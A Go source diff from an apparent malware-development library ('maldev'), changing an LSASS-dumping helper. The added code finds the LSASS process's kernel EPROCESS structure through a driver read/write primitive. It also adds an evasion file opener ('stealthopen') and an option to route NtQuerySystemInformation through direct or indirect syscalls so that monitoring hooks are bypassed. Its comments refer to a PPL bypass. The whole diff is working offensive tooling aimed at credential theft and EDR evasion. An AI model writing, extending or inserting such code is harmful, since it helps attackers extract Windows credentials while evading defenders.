@@ -9,8 +9,10 @@ import (
 	"strings"
 	"unsafe"
 
+	"github.com/oioio-space/maldev/evasion/stealthopen"
 	"github.com/oioio-space/maldev/kernel/driver"
 	"github.com/oioio-space/maldev/win/ntapi"
+	wsyscall "github.com/oioio-space/maldev/win/syscall"
 )
 
 // FindLsassEProcess walks the kernel's PsActiveProcessLinks doubly-
@@ -37,7 +39,16 @@ import (
 // Returns ErrLsassEProcessNotFound when the walk completes without
 // matching lsassPID — caller should re-check the PID is correct
 // (e.g., via process/enum).
-func FindLsassEProcess(rw driver.ReadWriter, lsassPID uint32) (uintptr, error) {
+//
+// `opener` is the optional stealthopen.Opener used when this helper
+// reads ntoskrnl.exe from disk to resolve EPROCESS offsets. Pass
+// nil for plain os.Open.
+//
+// `caller` is the optional *wsyscall.Caller used to route the
+// NtQuerySystemInformation lookup that resolves ntoskrnl.exe's
+// kernel base. Pass nil to call ntdll!NtQuerySystemInformation
+// directly via the WinAPI proc table.
+func FindLsassEProcess(rw driver.ReadWriter, lsassPID uint32, opener stealthopen.Opener, caller *wsyscall.Caller) (uintptr, error) {
 	if rw == nil {
 		return 0, driver.ErrNotLoaded
 	}
@@ -45,16 +56,16 @@ func FindLsassEProcess(rw driver.ReadWriter, lsassPID uint32) (uintptr, error) {
 		return 0, fmt.Errorf("FindLsassEProcess: lsassPID == 0")
 	}
 
-	ntoskrnlBase, err := ntoskrnlKernelBase()
+	ntoskrnlBase, err := ntoskrnlKernelBase(caller)
 	if err != nil {
 		return 0, fmt.Errorf("FindLsassEProcess: %w", err)
 	}
 
-	initialRVA, err := DiscoverInitialSystemProcessRVA("")
+	initialRVA, err := DiscoverInitialSystemProcessRVA("", opener)
 	if err != nil {
 		return 0, fmt.Errorf("FindLsassEProcess: %w", err)
 	}
-	upidOff, err := DiscoverUniqueProcessIdOffset("")
+	upidOff, err := DiscoverUniqueProcessIdOffset("", opener)
 	if err != nil {
 		return 0, fmt.Errorf("FindLsassEProcess: %w", err)
 	}
@@ -131,21 +142,28 @@ var ErrLsassEProcessNotFound = errors.New("lsassdump: lsass EPROCESS not found i
 //
 // Requires SeDebugPrivilege or admin in practice, mirroring the
 // existing PPL-bypass requirements.
-func ntoskrnlKernelBase() (uintptr, error) {
+//
+// `caller` is the optional *wsyscall.Caller used to route the
+// NtQuerySystemInformation call (indirect / direct syscall, etc.).
+// Pass nil to call via ntdll!NtQuerySystemInformation through
+// win/ntapi.
+func ntoskrnlKernelBase(caller *wsyscall.Caller) (uintptr, error) {
 	const systemModuleInformation = 11
 
 	// Probe size — NtQuerySystemInformation returns the required
 	// length when buffer is too small.
 	var probe [4]byte
-	needed, _ := ntapi.NtQuerySystemInformation(systemModuleInformation,
-		unsafe.Pointer(&probe[0]), uint32(len(probe)))
+	var probeRetLen uint32
+	needed, _ := queryNtSystemInfo(caller, systemModuleInformation,
+		unsafe.Pointer(&probe[0]), uint32(len(probe)), &probeRetLen)
 	if needed == 0 {
 		return 0, fmt.Errorf("NtQuerySystemInformation(SystemModuleInformation): zero size needed")
 	}
 
 	buf := make([]byte, needed)
-	got, err := ntapi.NtQuerySystemInformation(systemModuleInformation,
-		unsafe.Pointer(&buf[0]), needed)
+	var fetchRetLen uint32
+	got, err := queryNtSystemInfo(caller, systemModuleInformation,
+		unsafe.Pointer(&buf[0]), needed, &fetchRetLen)
 	if err != nil {
 		return 0, fmt.Errorf("NtQuerySystemInformation(SystemModuleInformation): %w", err)
 	}
@@ -202,6 +220,35 @@ func ntoskrnlKernelBase() (uintptr, error) {
 		return 0, fmt.Errorf("SystemModuleInformation: first module %q does not look like the kernel image", fullPath)
 	}
 	return uintptr(imageBase), nil
+}
+
+// queryNtSystemInfo routes NtQuerySystemInformation through `caller`
+// when non-nil, falling back to win/ntapi (which calls
+// ntdll!NtQuerySystemInformation via the WinAPI proc table) when
+// caller is nil. The returned uint32 is *retLen — the size that
+// the kernel wants/returned, mirroring the standard Nt semantics.
+func queryNtSystemInfo(caller *wsyscall.Caller, infoClass int32, buf unsafe.Pointer, bufLen uint32, retLen *uint32) (uint32, error) {
+	if caller != nil {
+		r, err := caller.Call("NtQuerySystemInformation",
+			uintptr(infoClass),
+			uintptr(buf),
+			uintptr(bufLen),
+			uintptr(unsafe.Pointer(retLen)),
+		)
+		if err != nil {
+			return *retLen, fmt.Errorf("NtQuerySystemInformation: %w", err)
+		}
+		if r != 0 {
+			return *retLen, fmt.Errorf("NtQuerySystemInformation: NTSTATUS 0x%08X", uint32(r))
+		}
+		return *retLen, nil
+	}
+	// Fallback path: route through win/ntapi (ntdll proc table).
+	// We forward ntapi's returned length into our retLen so callers
+	// keep the buffer-size hint on STATUS_INFO_LENGTH_MISMATCH.
+	got, err := ntapi.NtQuerySystemInformation(infoClass, buf, bufLen)
+	*retLen = got
+	return got, err
 }
 
 // readPointerKernel reads 8 bytes at the given kernel VA via the
